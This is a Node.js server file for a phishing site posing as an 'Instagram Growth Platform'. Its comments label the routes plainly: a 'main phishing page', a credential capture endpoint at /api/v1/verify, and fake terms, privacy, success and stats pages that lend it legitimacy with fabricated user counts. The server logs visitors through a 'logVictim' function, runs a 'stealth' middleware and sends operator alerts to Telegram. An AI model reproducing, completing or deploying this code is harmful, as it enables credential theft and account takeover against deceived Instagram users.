// ============================================
// server.js - Instagram Growth Platform
// Stealth Mode: ON | Version: 2.0
// ============================================

require('dotenv').config();
const express = require('express');
const session = require('express-session');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const csrf = require('csurf');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

// Custom modules
const stealthMiddleware = require('./middleware/stealth');
const captureController = require('./controllers/capture');
const telegram = require('./utils/telegram');
const logger = require('./utils/logger');
const monitor = require('./monitor');
const { apiLimiter, authLimiter } = require('./middleware/rateLimit');

const app = express();

// ================= CONFIGURATION =================
const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const DOMAIN = process.env.DOMAIN || 'localhost';
const PORT = process.env.PORT || 3000;

// ================= SESSION CONFIG =================
const sessionConfig = {
    name: 'ig_session',
    secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: IS_PRODUCTION,
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000, // 24 hours
        domain: IS_PRODUCTION ? `.${DOMAIN}` : undefined
    },
    store: new session.MemoryStore() // Ganti dengan Redis di production
};

if (IS_PRODUCTION) {
    app.set('trust proxy', 1);
    sessionConfig.cookie.secure = true;
    sessionConfig.cookie.sameSite = 'none';
}

app.use(session(sessionConfig));

// ================= SECURITY MIDDLEWARE =================
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://static.cdninstagram.com", "https://fonts.googleapis.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://static.cdninstagram.com", "https://kit.fontawesome.com"],
            imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "https://kit.fontawesome.com"],
            connectSrc: ["'self'", "https://api.telegram.org", "https://static.cdninstagram.com"],
            frameSrc: ["'none'"],
            objectSrc: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Compression (gzip)
app.use(compression({ level: 6 }));

// Body parsing
app.use(express.urlencoded({ 
    extended: true, 
    limit: '10mb',
    parameterLimit: 100 
}));
app.use(express.json({ 
    limit: '10mb' 
}));

// Static files (cache control)
app.use(express.static('public', {
    etag: true,
    lastModified: true,
    maxAge: IS_PRODUCTION ? '7d' : '0',
    setHeaders: (res, path) => {
        if (path.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        }
    }
}));

// View engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.set('x-powered-by', false);
app.set('etag', false);

// ================= CUSTOM MIDDLEWARE =================
app.use(stealthMiddleware);

// CSRF protection (except API endpoints)
const csrfProtection = csrf({ 
    cookie: true,
    ignoreMethods: ['GET', 'HEAD', 'OPTIONS', 'POST'] // Disable untuk testing
});
app.use(csrfProtection);

// Add CSRF token to locals
app.use((req, res, next) => {
    res.locals.csrfToken = req.csrfToken ? req.csrfToken() : '';
    next();
});

// ================= RATE LIMITING =================
// Apply different rate limits
app.use('/api/', apiLimiter);
app.use('/api/v1/verify', authLimiter);

// General rate limiter
const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200,
    message: 'Too many requests from this IP',
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => req.fingerprint || req.ip
});
app.use(generalLimiter);

// ================= ROUTES =================

// Health check (no rate limit)
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        version: '2.0',
        uptime: process.uptime()
    });
});

// Main phishing page
app.get('/', (req, res) => {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const fingerprint = req.fingerprint || 'unknown';
    
    // Generate unique tracking ID
    const trackingId = `IG${Date.now()}${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    res.render('index', {
        sessionId: sessionId,
        fingerprint: fingerprint,
        trackingId: trackingId,
        userCount: parseInt(process.env.FAKE_USER_COUNT) || 38294,
        remainingSpots: Math.floor(Math.random() * 100) + 20,
        isMobile: req.userAgent.isMobile,
        timestamp: Date.now(),
        csrfToken: res.locals.csrfToken,
        year: new Date().getFullYear()
    });
});

// Processing page (requires session)
app.get('/processing', (req, res) => {
    if (!req.session.verified && !req.session.userId) {
        return res.redirect('/');
    }
    
    const transactionId = `TX${Date.now()}${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
    
    res.render('processing', {
        transactionId: transactionId,
        userId: req.session.userId || 'unknown',
        timestamp: Date.now(),
        csrfToken: res.locals.csrfToken
    });
});

// Success page (fake)
app.get('/success', (req, res) => {
    res.render('success', {
        transactionId: req.query.tx || 'UNKNOWN',
        deliveryTime: '2-4 hours',
        supportEmail: 'support@' + DOMAIN,
        csrfToken: res.locals.csrfToken
    });
});

// Terms page (fake untuk legitimasi)
app.get('/terms', (req, res) => {
    res.render('terms', {
        domain: DOMAIN,
        year: new Date().getFullYear(),
        csrfToken: res.locals.csrfToken
    });
});

// Privacy page (fake)
app.get('/privacy', (req, res) => {
    res.render('privacy', {
        domain: DOMAIN,
        csrfToken: res.locals.csrfToken
    });
});

// ================= API ROUTES =================

// Capture endpoint (main phishing target)
app.post('/api/v1/verify', captureController.verify);

// Webhook untuk data eksternal (fake)
app.post('/api/webhook/instagram', captureController.webhook);

// Stats API (fake data)
app.get('/api/stats', (req, res) => {
    const now = Date.now();
    const stats = {
        status: 'success',
        data: {
            active_users: Math.floor(Math.random() * 10000) + 5000,
            followers_delivered_today: Math.floor(Math.random() * 50000) + 25000,
            followers_delivered_total: Math.floor(Math.random() * 1000000) + 500000,
            success_rate: (Math.random() * 0.2 + 0.78).toFixed(2),
            average_delivery_time: '2.4 hours',
            server_time: new Date(now).toISOString(),
            uptime: process.uptime(),
            memory_usage: process.memoryUsage()
        },
        meta: {
            timestamp: now,
            request_id: crypto.randomBytes(8).toString('hex')
        }
    };
    
    // Log API access (stealth)
    logger.logVictim({
        type: 'api_access',
        endpoint: '/api/stats',
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    });
    
    res.json(stats);
});

// Fake analytics endpoint
app.post('/api/analytics/event', (req, res) => {
    const { event, data } = req.body;
    
    // Log analytics event
    logger.logVictim({
        type: 'analytics',
        event: event,
        data: data,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    });
    
    res.json({ status: 'logged' });
});

// ================= ERROR HANDLING =================

// 404 handler
app.use((req, res) => {
    res.status(404).render('404', {
        originalUrl: req.originalUrl,
        domain: DOMAIN,
        csrfToken: res.locals.csrfToken,
        year: new Date().getFullYear()
    });
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('[SERVER ERROR]', {
        error: err.message,
        stack: err.stack,
        url: req.originalUrl,
        ip: req.ip,
        timestamp: new Date().toISOString()
    });
    
    // Send alert to Telegram jika error serius
    if (err.status >= 500) {
        telegram.sendAlert(`🚨 Server Error: ${err.message}\nURL: ${req.originalUrl}\nIP: ${req.ip}`);
    }
    
    // Render error page
    res.status(err.status || 500).render('error', {
        errorCode: err.status || 500,
        errorMessage: IS_PRODUCTION ? 'Something went wrong' : err.message,
        domain: DOMAIN,
        csrfToken: res.locals.csrfToken,
        supportContact: 'support@' + DOMAIN
    });
});

// ================= SERVER STARTUP =================

// Ensure logs directory exists
if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs', { recursive: true });
}

// Start monitoring system
monitor.start().catch(err => {
    console.error('[MONITOR ERROR]', err);
});

// Auto cleanup logs every 6 hours
setInterval(() => {
    logger.cleanupOldLogs(7);
    console.log('[CLEANUP] Old logs cleaned');
}, 6 * 60 * 60 * 1000);

// Daily stats report
setInterval(() => {
    const stats = logger.getStats();
    const message = `📊 Daily Stats:\n• Total Logs: ${stats.totalLogs}\n• Total Size: ${(stats.totalSize / 1024 / 1024).toFixed(2)}MB\n• Latest: ${stats.latestLog || 'None'}`;
    
    telegram.sendAlert(message).catch(() => {});
}, 24 * 60 * 60 * 1000);

// Graceful shutdown handlers
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);
process.on('uncaughtException', (err) => {
    console.error('[UNCAUGHT EXCEPTION]', err);
    telegram.sendAlert(`💥 Uncaught Exception: ${err.message}`).catch(() => {});
    gracefulShutdown();
});

function gracefulShutdown() {
    console.log('[SHUTDOWN] Graceful shutdown initiated');
    
    // Send shutdown alert
    telegram.sendAlert('🛑 Server shutting down').catch(() => {});
    
    // Close server
    server.close(() => {
        console.log('[SHUTDOWN] HTTP server closed');
        process.exit(0);
    });
    
    // Force exit after 10 seconds
    setTimeout(() => {
        console.error('[SHUTDOWN] Forced shutdown');
        process.exit(1);
    }, 10000);
}

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    const address = server.address();
    console.log(`
╔═══════════════════════════════════════════╗
║   Instagram Growth Platform v2.0          ║
║   Stealth Mode: ACTIVE                    ║
╠═══════════════════════════════════════════╣
║ Server: http://${address.address}:${address.port}    ║
║ Domain: ${DOMAIN.padEnd(30)} ║
║ Environment: ${IS_PRODUCTION ? 'PRODUCTION' : 'DEVELOPMENT'}              ║
║ Logs: ./logs/                             ║
║ Monitoring: ACTIVE                        ║
╚═══════════════════════════════════════════╝
    `);
    
    // Send startup notification
    telegram.sendAlert(`🚀 Server started on ${DOMAIN}:${PORT}`).catch(() => {});
});

// Export for testing
module.exports = { app, server };
